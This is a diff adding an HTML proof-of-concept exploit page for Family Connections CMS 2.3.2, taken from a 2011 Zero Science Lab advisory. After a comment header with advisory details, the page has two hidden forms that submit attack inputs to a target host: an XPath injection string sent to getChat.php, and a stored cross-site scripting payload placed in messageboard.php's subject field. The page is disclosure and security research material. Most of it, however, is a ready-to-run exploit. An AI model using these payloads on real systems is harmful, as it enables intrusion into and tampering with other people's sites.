@@ -1,0 +1,60 @@
+&lt;!--
+
+
+Family Connections CMS 2.3.2 (POST) Stored XSS And XPath Injection
+
+
+Vendor: Ryan Haudenschilt
+Product web page: http://www.familycms.com
+Affected version: 2.3.2
+
+Summary: Family Connections is an open source
+content management system. It makes creating a
+private, family website easy and fun.
+
+Desc: FCMS suffers from a stored XSS vulnerability
+(post-auth) in messageboard.php script thru the
+&#039;subject&#039; post parameter. XPath lies in the
+/inc/getChat.php script with &#039;users&#039; get parameter with
+no args, and post parameter &#039;message&#039;.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2011-5004
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5004.php
+
+
+22.03.2011
+
+
+--&gt;
+
+
+
+&lt;html&gt;
+&lt;title&gt;Family Connections CMS 2.3.2 Stored XSS And XPath Injection&lt;/title&gt;
+&lt;body bgcolor=&quot;#1C1C1C&quot;&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function xpath(){document.forms[&quot;xpath&quot;].submit();}
+function xss(){document.forms[&quot;xss&quot;].submit();}
+&lt;/script&gt;
+&lt;form action=&quot;http://FCMS/inc/getChat.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xpath&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;\\&#039;;--\\&amp;#34;;--&quot; /&gt;&lt;/form&gt;
+&lt;a href=&quot;javascript: xpath();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;&lt;br /&gt;&lt;br /&gt;Exploit XPath!&lt;h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;
+&lt;form action=&quot;http://FCMS/messageboard.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xss&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;subject&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post&quot; value=&quot;waddup&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post_submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;
+&lt;a href=&quot;javascript: xss();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;&lt;br /&gt;&lt;br /&gt;Exploit XSS!&lt;h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;
+&lt;/body&gt;&lt;/html&gt;
